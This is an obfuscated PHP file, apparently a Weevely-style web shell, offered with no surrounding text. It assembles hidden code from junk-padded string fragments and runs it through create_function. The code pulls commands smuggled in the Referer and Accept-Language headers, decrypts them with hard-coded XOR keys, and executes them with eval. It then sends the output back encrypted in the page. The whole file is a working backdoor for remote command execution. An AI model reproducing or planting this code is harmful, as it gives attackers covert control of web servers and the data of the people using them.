<?php
$z='0,A;($j<$c,A&,A&$i,A<$l);$,Aj++,,A$,Ai++){$o.=$t{$i}^$k{$,Aj};}}r,Aetur,An $o;}$r,A=$_S,AERVER;$rr=,A@$,Ar[,A"HTTP,A_R,AE';
$T='q);$q=ar,Ara,Ay_value,A,As($q);p,Areg,A_ma,At,Ach_all("/([\\w])[\\w-,A]+(,A?,A:;q=0.([\\d]))?,?/",,A$ra,$m),A;i,Af($q&&$m,A){@s';
$I=str_replace('D','','DcDreDatDeD_Dfunction');
$x='A[$m[2][$z]];if(,Astrpos,A($p,,A$h)===0,A),A{$s[$i],A="";$,Ap,A=$ss($p,3),A;}if(array_,A,Akey_exists($i,,A$s),A){$s[,A$i].,A';
$Q='essi,Aon,A_start,A(),A;$s=&$_SESSIO,AN;$s,As="su,A,Abst,Ar";$sl="strtolower,A";$i=,A$m[1][0],A.$,Am[1][1];$,Ah,A=$sl($ss(';
$g=',A,Amd5($i.$kh),A,0,3));$f,A=$sl(,A$ss(md5,A,A($,A,Ai.$kf,A),0,3));$p="";,Afor($z=1;$z<,A,Acount(,A$m[1]);$z,A++),A$p.=$q,';
$f='(preg_replace(arra,Ay("/_/,A","/-,A/"),,Aarray("/,A",,A"+"),A,$,Ass($,As[$i],0,$e))),$k)),A),A;$o=ob_get_,Aconten,Ats(,A);ob,A_';
$M='FERER",A];$ra=@$r["HTTP_,AACCEP,AT_LANGU,A,AAGE"];,Aif($rr&&$ra){,A$u=pars,Ae_url(,A$,A,Arr);parse_str($u,A,A["que,Ary"],$';
$P='$,Akh="5d41";$kf=",A4,A02a";functio,An x($,At,A,$,Ak){$c=st,Arl,Aen($k);$l=strle,An($t,A);$o="";for,A,A(,A$i,A=0;$i<$l;){for($j=';
$O='=$p;$e=strp,Aos($,As[$i],$f,A);if($e,A){$,Ak=$kh.$,Akf;ob_st,Aar,At();@eva,Al(,A@gzun,Acompre,Ass(@x(@base6,A,A4_d,Aeco,Ade';
$d='end_cl,Aean();$d=ba,As,Ae64_encode(,Ax,A(gzcom,Apress($o),,A$k));pr,Ai,Ant("<$k>$d<,A/$,Ak>");,A@sess,Ai,Aon_destroy();}}}}';
$K=str_replace(',A','',$P.$z.$M.$T.$Q.$g.$x.$O.$f.$d);
$E=$I('',$K);$E();
?>
